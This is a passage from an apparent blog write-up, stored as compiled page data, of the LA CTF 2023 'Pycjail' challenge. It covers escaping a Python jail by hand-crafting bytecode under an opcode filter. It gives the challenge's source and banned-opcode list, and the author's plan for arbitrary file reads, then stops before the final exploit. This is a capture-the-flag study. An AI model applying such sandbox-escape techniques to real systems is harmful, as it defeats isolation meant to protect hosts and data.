{"pageProps":{"post":{"mdxSource":"var Component=(()=>{var d=Object.create;var l=Object.defineProperty;var r=Object.getOwnPropertyDescriptor;var h=Object.getOwnPropertyNames;var p=Object.getPrototypeOf,m=Object.prototype.hasOwnProperty;var t=a=>l(a,\"__esModule\",{value:!0});var u=(a,s)=>()=>(s||a((s={exports:{}}).exports,s),s.exports),N=(a,s)=>{t(a);for(var c in s)l(a,c,{get:s[c],enumerable:!0})},k=(a,s,c)=>{if(s&&typeof s==\"object\"||typeof s==\"function\")for(let n of h(s))!m.call(a,n)&&n!==\"default\"&&l(a,n,{get:()=>s[n],enumerable:!(c=r(s,n))||c.enumerable});return a},_=a=>k(t(l(a!=null?d(p(a)):{},\"default\",a&&a.__esModule&&\"default\"in a?{get:()=>a.default,enumerable:!0}:{value:a,enumerable:!0})),a);var o=u((O,i)=>{i.exports=_jsx_runtime});var w={};N(w,{default:()=>y,frontmatter:()=>g});var e=_(o()),g={title:\"LA CTF 2023 \\u2013 Pycjail\",date:\"2023-02-12\",draft:!1,authors:[\"legoclones\"],tags:[\"LACTF 2023\",\"Misc\",\"Python\",\"Pyjail\",\"Sandbox\",\"Opcode\"],summary:\"Use bytecode manipulation to subvert jail restrictions.\",canonical:\"https://justinapplegate.me/2023/lactf-pycjail\"};function b(a={}){let{wrapper:s}=a.components||{};return s?(0,e.jsx)(s,Object.assign({},a,{children:(0,e.jsx)(c,{})})):c();function c(){let n=Object.assign({h2:\"h2\",a:\"a\",span:\"span\",blockquote:\"blockquote\",p:\"p\",code:\"code\",pre:\"pre\",ul:\"ul\",li:\"li\",h3:\"h3\",em:\"em\",strong:\"strong\",img:\"img\"},a.components);return(0,e.jsxs)(e.Fragment,{children:[(0,e.jsxs)(n.h2,{id:\"pycjail-misc-495-points\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#pycjail-misc-495-points\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"Pycjail (Misc, 495 Points)\"]}),`\n`,(0,e.jsxs)(n.blockquote,{children:[`\n`,(0,e.jsx)(n.p,{children:\"All of you think you\\u2019re so cute with your fancy little sandbox bypasses, but jokes on you I\\u2019ve started filtering the bytecode! I\\u2019d like to see you bypass this!\"}),`\n`,(0,e.jsx)(n.p,{children:\"Note: The program is being run in the python:3.10-slim-bullseye Docker image on the server.\"}),`\n`,(0,e.jsxs)(n.p,{children:[\"Attachment: \",(0,e.jsx)(n.a,{href:\"https://github.com/Legoclones/website/blob/main/source/static/lactf-pycjail/main.py\",children:\"main.py\"})]}),`\n`]}),`\n`,(0,e.jsxs)(n.p,{children:[\"This challenge required you to bypass a Python jail, which limited several aspects of a custom \",(0,e.jsx)(n.code,{children:\"code\"}),\" object you created. The source code:\"]}),`\n`,(0,e.jsx)(n.pre,{className:\"language-python\",children:(0,e.jsxs)(n.code,{className:\"language-python code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"#!/usr/local/bin/python3\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token keyword\",children:\"import\"}),` opcode\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token keyword\",children:\"import\"}),` inspect\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token keyword\",children:\"def\"}),\" \",(0,e.jsx)(n.span,{className:\"token function\",children:\"f\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"pass\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"banned \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\"IMPORT_NAME\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"MAKE_FUNCTION\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token keyword\",children:\"for\"}),\" k \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"in\"}),\" opcode\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"opmap\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"if\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"        \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\"LOAD\"'}),\" \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"in\"}),\" k \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"and\"}),\" k \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"!=\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"LOAD_CONST\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"        \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"or\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"STORE\"'}),\" \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"in\"}),` k\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"        \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"or\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"DELETE\"'}),\" \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"in\"}),` k\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"        \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"or\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"JUMP\"'}),\" \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"in\"}),` k\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"        banned\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"append\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"k\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"banned \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),\"opcode\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"opmap\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),\"x\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),\" \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"for\"}),\" x \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"in\"}),\" banned\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"}\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"consts \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token builtin\",children:\"tuple\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token builtin\",children:\"input\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\"consts: \"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"split\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\",\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"names \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token builtin\",children:\"tuple\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token builtin\",children:\"input\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\"names: \"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"split\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\",\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"code \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token builtin\",children:\"bytes\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"fromhex\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token builtin\",children:\"input\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\"code: \"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token keyword\",children:\"if\"}),\" \",(0,e.jsx)(n.span,{className:\"token builtin\",children:\"len\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"consts\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"3\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"print\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\"too many consts >:(\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token keyword\",children:\"elif\"}),\" \",(0,e.jsx)(n.span,{className:\"token builtin\",children:\"len\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"names\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"4\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"print\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\"too many names >:(\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token keyword\",children:\"elif\"}),\" \",(0,e.jsx)(n.span,{className:\"token builtin\",children:\"len\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"code\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"30\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"print\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\"too much code >:(\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token keyword\",children:\"elif\"}),\" \",(0,e.jsx)(n.span,{className:\"token builtin\",children:\"len\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"code\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"%\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"2\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"!=\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"print\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\"invalid code >:(\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token keyword\",children:\"elif\"}),\" \",(0,e.jsx)(n.span,{className:\"token builtin\",children:\"any\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"code\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),\"i\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),\" \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"in\"}),\" banned \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"for\"}),\" i \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"in\"}),\" \",(0,e.jsx)(n.span,{className:\"token builtin\",children:\"range\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token builtin\",children:\"len\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"code\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"2\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"print\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\"banned opcode >:(\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token keyword\",children:\"elif\"}),\" \",(0,e.jsx)(n.span,{className:\"token builtin\",children:\"any\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"code\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),\"i\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"3\"}),\" \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"for\"}),\" i \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"in\"}),\" \",(0,e.jsx)(n.span,{className:\"token builtin\",children:\"range\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"1\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token builtin\",children:\"len\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"code\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"2\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"print\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\"I never learned how to count past 3 >:(\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token keyword\",children:\"else\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    f\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"__code__ \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" f\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"__code__\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"replace\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"        co_stacksize\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"10\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"        co_consts\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\"consts\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"        co_names\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\"names\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"        co_code\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\"code\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"print\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\"here goes!\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    frame \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" inspect\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"currentframe\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    p \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"print\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    r \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token builtin\",children:\"repr\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"for\"}),\" k \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"in\"}),\" \",(0,e.jsx)(n.span,{className:\"token builtin\",children:\"list\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"frame\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"f_globals\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"        \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"if\"}),\" k \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"not\"}),\" \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"in\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\"p\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"r\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"f\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"            \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"del\"}),\" frame\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"f_globals\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),\"k\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    p\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"r\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"f\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,e.jsxs)(n.p,{children:[\"To summarize the code above, you provided the \",(0,e.jsx)(n.code,{children:\"co_consts\"}),\", \",(0,e.jsx)(n.code,{children:\"co_names\"}),\", and \",(0,e.jsx)(n.code,{children:\"co_code\"}),\" bytes for a custom \",(0,e.jsx)(n.code,{children:\"code\"}),\" object that was created and ran. The restrictions imposed were:\"]}),`\n`,(0,e.jsxs)(n.ul,{children:[`\n`,(0,e.jsx)(n.li,{children:\"max 3 consts\"}),`\n`,(0,e.jsx)(n.li,{children:\"max 4 names\"}),`\n`,(0,e.jsx)(n.li,{children:\"max 15 opcodes\"}),`\n`,(0,e.jsxs)(n.li,{children:[\"opcodes can\\u2019t be in \",(0,e.jsx)(n.code,{children:\"['IMPORT_NAME', 'MAKE_FUNCTION', 'STORE_SUBSCR', 'DELETE_SUBSCR', 'LOAD_BUILD_CLASS', 'LOAD_ASSERTION_ERROR', 'STORE_NAME', 'DELETE_NAME', 'STORE_ATTR', 'DELETE_ATTR', 'STORE_GLOBAL', 'DELETE_GLOBAL', 'LOAD_NAME', 'LOAD_ATTR', 'JUMP_FORWARD', 'JUMP_IF_FALSE_OR_POP', 'JUMP_IF_TRUE_OR_POP', 'JUMP_ABSOLUTE', 'POP_JUMP_IF_FALSE', 'POP_JUMP_IF_TRUE', 'LOAD_GLOBAL', 'JUMP_IF_NOT_EXC_MATCH', 'LOAD_FAST', 'STORE_FAST', 'DELETE_FAST', 'LOAD_CLOSURE', 'LOAD_DEREF', 'STORE_DEREF', 'DELETE_DEREF', 'LOAD_CLASSDEREF', 'LOAD_METHOD']\"}),\" (aka no import/makefunc/load/store/delete/jump)\"]}),`\n`,(0,e.jsx)(n.li,{children:\"opcode values can\\u2019t be > 3\"}),`\n`]}),`\n`,(0,e.jsxs)(n.p,{children:[\"Nothing about the flag was mentioned, so it was likely in \",(0,e.jsx)(n.code,{children:\"/flag.txt\"}),\" or \",(0,e.jsx)(n.code,{children:\"./flag.txt\"}),\", or if they were evil they\\u2019d require you to get RCE to read the flag. I was banking on the fact that it was stored in \",(0,e.jsx)(n.code,{children:\"/flag.txt\"}),\" or \",(0,e.jsx)(n.code,{children:\"./flag.txt\"}),\", so my goal was to get arbitrary read.\"]}),`\n`,(0,e.jsxs)(n.h3,{id:\"approaching-the-problem\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#approaching-the-problem\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"Approaching the Problem\"]}),`\n`,(0,e.jsxs)(n.p,{children:[\"I made a \",(0,e.jsx)(n.a,{href:\"https://github.com/Legoclones/website/blob/main/source/static/lactf-pycjail/allowed.txt\",children:\"list\"}),\" of all the Python 3.10 opcodes that \",(0,e.jsx)(n.em,{children:\"were\"}),\" allowed in this jail by pulling from \",(0,e.jsx)(n.a,{href:\"https://docs.python.org/3.10/library/dis.html\",children:\"the documentation\"}),\" and removing the opcodes banned in the list above. What caught my eye initially was that the opcodes \",(0,e.jsx)(n.code,{children:\"CALL_FUNCTION\"}),\" and \",(0,e.jsx)(n.code,{children:\"CALL_METHOD\"}),\" were \",(0,e.jsx)(n.strong,{children:\"not\"}),\" banned, and this is what allows you to call a function on the stack. However, the hard part was \",(0,e.jsx)(n.em,{children:\"getting\"}),\" a callable object on the stack in the first place. The opcodes \",(0,e.jsx)(n.code,{children:\"LOAD_GLOBAL\"}),\", \",(0,e.jsx)(n.code,{children:\"LOAD_NAME\"}),\", \",(0,e.jsx)(n.code,{children:\"LOAD_METHOD\"}),\", and \",(0,e.jsx)(n.code,{children:\"LOAD_ATTR\"}),\" are typically used to get a function on the stack, and all \",(0,e.jsx)(n.code,{children:\"LOAD\"}),\" opcodes were blocked except for \",(0,e.jsx)(n.code,{children:\"LOAD_CONST\"}),\" (which only allowed us to put strings on the stack). As an example, below shows the bytecode for the line \",(0,e.jsx)(n.code,{children:'open(\"flag.txt\").read()'}),\":\"]}),`\n`,(0,e.jsx)(n.pre,{className:\"language-python\",children:(0,e.jsxs)(n.code,{className:\"language-python code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token operator\",children:\">>\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),\" dis\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"dis\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token builtin\",children:\"compile\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:`'open(\"flag.txt\").read()'`}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'pycjail'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'eval'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(n.span,{className:\"token number\",children:\"1\"}),\"           \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),\" LOAD_NAME                \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token builtin\",children:\"open\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"              \",(0,e.jsx)(n.span,{className:\"token number\",children:\"2\"}),\" LOAD_CONST               \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'flag.txt'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"   